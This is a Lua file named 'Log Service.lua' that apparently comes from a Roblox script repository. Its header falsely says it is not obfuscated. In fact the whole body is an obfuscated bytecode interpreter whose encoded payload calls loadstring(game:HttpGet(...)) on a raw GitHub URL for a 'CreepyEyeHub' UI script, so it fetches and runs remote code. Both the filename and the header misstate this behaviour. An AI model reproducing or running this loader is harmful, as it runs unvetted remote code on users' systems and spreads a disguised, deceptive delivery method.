--[[
    Log Service.lua  —  organised by minimarchbleeding
    Original : Drop56796/Log-Service  ->  Log Service.lua
    Not obfuscated; reproduced as-is.
--]]

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 79) then
			local v88 = 0;
			while true do
				if (v88 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v89 = v2(v0(v30, 16));
			if v19 then
				local v114 = v5(v89, v19);
				v19 = nil;
				return v114;
			else
				return v89;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v90 = 0;
			local v91;
			while true do
				if (v90 == (0 - 0)) then
					v91 = (v31 / (((5 + 0) - 3) ^ (v32 - (1 - (0 - 0))))) % ((4 - 2) ^ (((v33 - (620 - (555 + 64))) - (v32 - (932 - (857 + 74)))) + (569 - ((1432 - (68 + 997)) + 201))));
					return v91 - (v91 % (928 - (214 + 713)));
				end
			end
		else
			local v92 = (1 + 1) ^ (v32 - ((1271 - (226 + 1044)) + 0));
			return (((v31 % (v92 + v92)) >= v92) and (878 - (282 + 595))) or (1637 - ((6631 - 5108) + 114));
		end
	end
	local function v21()
		local v34 = 117 - ((58 - 26) + 85);
		local v35;
		while true do
			if (v34 == (1 + 0)) then
				return v35;
			end
			if (v34 == (0 + 0)) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + (958 - (892 + 65));
				v34 = 2 - 1;
			end
		end
	end
	local function v22()
		local v36 = 0 - 0;
		local v37;
		local v38;
		while true do
			if (v36 == (1 + 0)) then
				return (v38 * (606 - (87 + 263))) + v37;
			end
			if (v36 == (180 - (67 + 113))) then
				v37, v38 = v1(v16, v18, v18 + 2);
				v18 = v18 + 2 + (0 - 0);
				v36 = 2 - 1;
			end
		end
	end
	local function v23()
		local v39, v40, v41, v42 = v1(v16, v18, v18 + ((557 + 398) - (802 + (197 - 47))));
		v18 = v18 + 3 + (1188 - (1069 + 118));
		return (v42 * (16778213 - (915 + 82))) + (v41 * (176444 - 110908)) + (v40 * (724 - 468)) + v39;
	end
	local function v24()
		local v43 = 0 - 0;
		local v44;
		local v45;
		local v46;
		local v47;
		local v48;
		local v49;
		while true do
			if ((1140 - (116 + 1022)) == v43) then
				v48 = v20(v45, 87 - 66, 1 + 30);
				v49 = ((v20(v45, (55 + 14) - 37) == (3 - (1057 - (87 + 968)))) and -(1 + 0)) or (1 - 0);
				v43 = 3 + 0;
			end
			if (v43 == (792 - (368 + 423))) then
				v46 = 1;
				v47 = (v20(v45, 3 - 2, 38 - (10 + 8)) * ((7 - 5) ^ (56 - 24))) + v44;
				v43 = 1082 - (1020 + 60);
			end
			if (v43 == ((6277 - 4851) - (572 + 58 + 793))) then
				if (v48 == (0 - 0)) then
					if (v47 == (442 - (416 + 26))) then
						return v49 * (0 - 0);
					else
						v48 = 1 + 0;
						v46 = 1747 - (760 + 987);
					end
				elseif (v48 == (3621 - (3557 - 1983))) then
					return ((v47 == (1913 - (1789 + 124))) and (v49 * ((439 - (145 + 293)) / (430 - (44 + 386))))) or (v49 * NaN);
				end
				return v8(v49, v48 - (2814 - 1791)) * (v46 + (v47 / ((1488 - (998 + 488)) ^ (17 + 35))));
			end
			if (v43 == (0 + 0)) then
				v44 = v23();
				v45 = v23();
				v43 = 1;
			end
		end
	end
	local function v25(v50)
		local v51;
		if not v50 then
			v50 = v23();
			if (v50 == (1413 - (447 + 966))) then
				return "";
			end
		end
		v51 = v3(v16, v18, (v18 + v50) - (2 - 1));
		v18 = v18 + v50;
		local v52 = {};
		for v68 = 1818 - (1703 + 114), #v51 do
			v52[v68] = v2(v1(v3(v51, v68, v68)));
		end
		return v6(v52);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v53 = (function()
			return function(v93, v94, v95, v96, v97, v98, v99, v100)
				local v93 = (function()
					return 1636 - (1373 + 263);
				end)();
				local v94 = (function()
					return;
				end)();
				local v95 = (function()
					return;
				end)();
				while true do
					if (#":" ~= v93) then
					else
						if (v94 == #" ") then
							v95 = (function()
								return v96() ~= 0;
							end)();
						elseif (v94 == (1002 - (451 + 549))) then
							v95 = (function()
								return v97();
							end)();
						elseif (v94 == #"xnx") then
							v95 = (function()
								return v98();
							end)();
						end
						v99[v100] = (function()
							return v95;
						end)();
						break;
					end
					if (v93 ~= (0 + 0)) then
					else
						local v120 = (function()
							return 0;
						end)();
						local v121 = (function()
							return;
						end)();
						while true do
							if (v120 ~= (0 - 0)) then
							else
								v121 = (function()
									return 0 - 0;
								end)();
								while true do
									if (v121 ~= 1) then
									else
										v93 = (function()
											return #"[";
										end)();
										break;
									end
									if (v121 == (1384 - (746 + 638))) then
										v94 = (function()
											return v96();
										end)();
										v95 = (function()
											return nil;
										end)();
										v121 = (function()
											return 1;
										end)();
									end
								end
								break;
							end
						end
					end
				end
				return v93, v94, v95, v96, v97, v98, v99, v100;
			end;
		end)();
		local v54 = (function()
			return function(v101, v102, v103)
				local v104 = (function()
					return 0;
				end)();
				local v105 = (function()
					return;
				end)();
				while true do
					if (v104 ~= 0) then
					else
						v105 = (function()
							return 0 + 0;
						end)();
						while true do
							if (v105 == 0) then
								local v123 = (function()
									return 0 - 0;
								end)();
								local v124 = (function()
									return;
								end)();
								while true do
									if (v123 == (341 - (218 + 123))) then
										v124 = (function()
											return 0;
										end)();
										while true do
											if (v124 == (1581 - (1535 + 46))) then
												local v171 = (function()
													return 0;
												end)();
												while true do
													if (v171 == 0) then
														v101[v102 - #"["] = (function()
															return v103();
														end)();
														return v101, v102, v103;
													end
												end
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
				end
			end;
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {};
		end)();
		local v58 = (function()
			return {v55,v56,nil,v57};
		end)();
		local v59 = (function()
			return v23();
		end)();
		local v60 = (function()
			return {};
		end)();
		for v70 = #">", v59 do
			FlatIdent_7F35E, Type, Cons, v21, v24, v25, v60, v70 = (function()
				return v53(FlatIdent_7F35E, Type, Cons, v21, v24, v25, v60, v70);
			end)();
		end
		v58[#"91("] = (function()
			return v21();
		end)();
		for v71 = #"\\", v23() do
			local v72 = (function()
				return v21();
			end)();
			if (v20(v72, #" ", #"[") == (0 + 0)) then
				local v109 = (function()
					return 0;
				end)();
				local v110 = (function()
					return;
				end)();
				local v111 = (function()
					return;
				end)();
				local v112 = (function()
					return;
				end)();
				local v113 = (function()
					return;
				end)();
				while true do
					if ((1 + 0) ~= v109) then
					else
						local v122 = (function()
							return 560 - (306 + 254);
						end)();
						while true do
							if ((0 + 0) == v122) then
								v112 = (function()
									return nil;
								end)();
								v113 = (function()
									return nil;
								end)();
								v122 = (function()
									return 1 - 0;
								end)();
							end
							if (v122 ~= (1468 - (899 + 568))) then
							else
								v109 = (function()
									return 2;
								end)();
								break;
							end
						end
					end
					if (v109 == 2) then
						while true do
							if (v110 == 2) then
								local v129 = (function()
									return 0 + 0;
								end)();
								while true do
									if (v129 == 0) then
										if (v20(v112, #"}", #".") ~= #",") then
										else
											v113[2] = (function()
												return v60[v113[4 - 2]];
											end)();
										end
										if (v20(v112, 2, 605 - (268 + 335)) ~= #"<") then
										else
											v113[#"gha"] = (function()
												return v60[v113[#"nil"]];
											end)();
										end
										v129 = (function()
											return 1;
										end)();
									end
									if (v129 == (291 - (60 + 230))) then
										v110 = (function()
											return #"xnx";
										end)();
										break;
									end
								end
							end
							if (v110 ~= #":") then
							else
								local v130 = (function()
									return 572 - (426 + 146);
								end)();
								local v131 = (function()
									return;
								end)();
								while true do
									if (v130 == 0) then
										v131 = (function()
											return 0 + 0;
										end)();
										while true do
											if (v131 == 0) then
												v113 = (function()
													return {v22(),v22(),nil,nil};
												end)();
												if (v111 == 0) then
													local v177 = (function()
														return 1456 - (282 + 1174);
													end)();
													local v178 = (function()
														return;
													end)();
													while true do
														if (v177 == (811 - (569 + 242))) then
															v178 = (function()
																return 0;
															end)();
															while true do
																if (0 == v178) then
																	v113[#"91("] = (function()
																		return v22();
																	end)();
																	v113[#".com"] = (function()
																		return v22();
																	end)();
																	break;
																end
															end
															break;
														end
													end
												elseif (v111 == #"]") then
													v113[#"-19"] = (function()
														return v23();
													end)();
												elseif (v111 == 2) then
													v113[#"gha"] = (function()
														return v23() - ((5 - 3) ^ (1 + 15));
													end)();
												elseif (v111 == #"91(") then
													local v185 = (function()
														return 1024 - (706 + 318);
													end)();
													local v186 = (function()
														return;
													end)();
													while true do
														if (v185 == (1251 - (721 + 530))) then
															v186 = (function()
																return 1271 - (945 + 326);
															end)();
															while true do
																if (v186 == 0) then
																	v113[#"xnx"] = (function()
																		return v23() - (2 ^ 16);
																	end)();
																	v113[#".com"] = (function()
																		return v22();
																	end)();
																	break;
																end
															end
															break;
														end
													end
												end
												v131 = (function()
													return 1;
												end)();
											end
											if (v131 == 1) then
												v110 = (function()
													return 4 - 2;
												end)();
												break;
											end
										end
										break;
									end
								end
							end
							if (v110 ~= (0 + 0)) then
							else
								local v132 = (function()
									return 700 - (271 + 429);
								end)();
								local v133 = (function()
									return;
								end)();
								while true do
									if ((0 + 0) ~= v132) then
									else
										v133 = (function()
											return 0;
										end)();
										while true do
											if ((1500 - (1408 + 92)) ~= v133) then
											else
												v111 = (function()
													return v20(v72, 2, #"gha");
												end)();
												v112 = (function()
													return v20(v72, #"xnxx", 1092 - (461 + 625));
												end)();
												v133 = (function()
													return 1289 - (993 + 295);
												end)();
											end
											if (v133 ~= (1 + 0)) then
											else
												v110 = (function()
													return #"|";
												end)();
												break;
											end
										end
										break;
									end
								end
							end
							if (v110 == #"xxx") then
								if (v20(v112, #"gha", #"gha") == #":") then
									v113[#"asd1"] = (function()
										return v60[v113[#"http"]];
									end)();
								end
								v55[v71] = (function()
									return v113;
								end)();
								break;
							end
						end
						break;
					end
					if (v109 ~= 0) then
					else
						v110 = (function()
							return 0;
						end)();
						v111 = (function()
							return nil;
						end)();
						v109 = (function()
							return 1;
						end)();
					end
				end
			end
		end
		for v73 = #"|", v23() do
			v56, v73, v28 = (function()
				return v54(v56, v73, v28);
			end)();
		end
		return v58;
	end
	local function v29(v62, v63, v64)
		local v65 = v62[1 + 0];
		local v66 = v62[1173 - ((1106 - 688) + 753)];
		local v67 = v62[2 + 1];
		return function(...)
			local v74 = v65;
			local v75 = v66;
			local v76 = v67;
			local v77 = v27;
			local v78 = (1934 - (565 + 1368)) + 0;
			local v79 = -(1 + 0);
			local v80 = {};
			local v81 = {...};
			local v82 = v12("#", ...) - (1552 - (1126 + 425));
			local v83 = {};
			local v84 = {};
			for v106 = 405 - (118 + 287), v82 do
				if (v106 >= v76) then
					v80[v106 - v76] = v81[v106 + 1];
				else
					v84[v106] = v81[v106 + (530 - (406 + 123))];
				end
			end
			local v85 = (v82 - v76) + (1770 - (1749 + 20));
			local v86;
			local v87;
			while true do
				v86 = v74[v78];
				v87 = v86[1 + 0];
				if (v87 <= (1328 - (1249 + 73))) then
					if (v87 <= ((33 - 24) - 7)) then
						if (v87 <= 0) then
							v84[v86[1 + 1]] = v86[1148 - (466 + 679)];
						elseif (v87 > (2 - 1)) then
							local v135 = 0 - 0;
							local v136;
							local v137;
							local v138;
							local v139;
							while true do
								if ((v135 == 0) or (2318 >= 4800)) then
									v136 = v86[(1663 - (1477 + 184)) + 0];
									v137, v138 = v77(v84[v136](v13(v84, v136 + (1901 - (106 + 1794)), v86[1 + 2])));
									v135 = 1 + 0;
								end
								if (v135 == ((6 - 1) - 3)) then
									for v174 = v136, v79 do
										local v175 = (0 + 0) - 0;
										while true do
											if ((v175 == (0 - 0)) or (142 >= 4749)) then
												v139 = v139 + ((971 - (564 + 292)) - (4 + 110));
												v84[v174] = v137[v139];
												break;
											end
										end
									end
									break;
								end
								if (v135 == (585 - ((98 - 41) + 527))) then
									v79 = (v138 + v136) - 1;
									v139 = 0 + 0;
									v135 = 1429 - (41 + 1386);
								end
							end
						else
							do
								return;
							end
						end
					elseif ((3926 <= 4134) and (v87 <= (107 - (17 + 86)))) then
						if (v87 > ((8 - 5) + (304 - (244 + 60)))) then
							v84[v86[3 - (1 + 0)]] = v64[v86[(484 - (41 + 435)) - 5]];
						else
							local v142 = 166 - (122 + 44);
							local v143;
							while true do
								if (v142 == (0 - 0)) then
									v143 = v86[(1007 - (938 + 63)) - 4];
									v84[v143] = v84[v143](v13(v84, v143 + (1203 - (373 + 638 + 191)), v79));
									break;
								end
							end
						end
					elseif (v87 > (5 + 0)) then
						v84[v86[1 + 1]] = v86[(1130 - (936 + 189)) - 2];
					else
						v84[v86[733 - (476 + 84 + 171)]]();
					end
				elseif ((v87 <= (74 - (30 + (1648 - (1565 + 48))))) or (164 >= 2785)) then
					if ((v87 <= (5 + 2)) or (525 == 2109)) then
						local v127 = 1257 - (1043 + 214);
						local v128;
						while true do
							if (v127 == (0 - 0)) then
								v128 = v86[1214 - (323 + 889)];
								v84[v128] = v84[v128](v13(v84, v128 + (2 - 1), v79));
								break;
							end
						end
					elseif (v87 == (588 - (361 + 219))) then
						v84[v86[322 - (53 + 267)]] = v64[v86[219 - (42 + 174)]];
					else
						v84[v86[1 + 1]]();
					end
				elseif (v87 <= (424 - (15 + 398))) then
					if (v87 == (992 - (18 + 964))) then
						local v148 = v86[1 + 1];
						local v149, v150 = v77(v84[v148](v13(v84, v148 + 1, v86[3])));
						v79 = (v150 + v148) - (3 - 2);
						local v151 = (930 + 574) - (363 + 1141);
						for v165 = v148, v79 do
							v151 = v151 + 1 + 0;
							v84[v165] = v149[v151];
						end
					else
						local v152 = v86[1582 - ((2321 - (782 + 356)) + 397)];
						local v153 = v84[v86[(269 - (176 + 91)) + 1]];
						v84[v152 + (851 - (20 + 830))] = v153;
						v84[v152] = v153[v86[4 + 0]];
					end
				elseif ((33 == 33) and (v87 > (138 - (116 + 10)))) then
					local v157 = v86[1 + 1];
					local v158 = v84[v86[741 - (542 + 196)]];
					v84[v157 + (1 - 0)] = v158;
					v84[v157] = v158[v86[4]];
				else
					do
						return;
					end
				end
				v78 = v78 + 1 + 0;
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403453O00682O7470733A2O2F6769746875622E636F6D2F44726F7035363739362F43722O6570794579654875622F626C6F622F546F704261722F55492E6C75613F7261773D7472756500083O0012083O00013O001208000100023O00200D000100010003001206000300044O0002000100034O00075O00022O00053O000100012O00013O00017O00", v9(), ...);
